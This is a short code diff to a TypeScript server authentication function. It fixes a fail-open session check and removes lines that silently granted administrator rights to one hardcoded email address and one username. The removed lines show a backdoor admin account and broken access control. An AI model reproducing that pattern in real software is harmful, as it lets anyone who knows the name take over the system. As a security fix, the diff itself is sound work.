@@ -47,7 +47,7 @@ export async function getServerAuthStatus(): Promise<AuthStatusResult> {
         select: { isActive: true },
       });
 
-      if (dbSession && !dbSession.isActive) {
+      if (!dbSession || !dbSession.isActive) {
         return {
           isAuthenticated: false,
           isRegistered: false,
@@ -61,14 +61,7 @@ export async function getServerAuthStatus(): Promise<AuthStatusResult> {
       touchSession(sessionToken).catch(() => {});
     }
 
-    const isSystemAdmin =
-      user.role === "ADMIN" ||
-      user.email === "admin@anlinks.dev" ||
-      user.username === "sysadmin";
-    if (isSystemAdmin) {
-      user.role = "ADMIN";
-    }
-
+    const isSystemAdmin = user.role === "ADMIN";
     return {
       isAuthenticated: true,
       isRegistered: true,
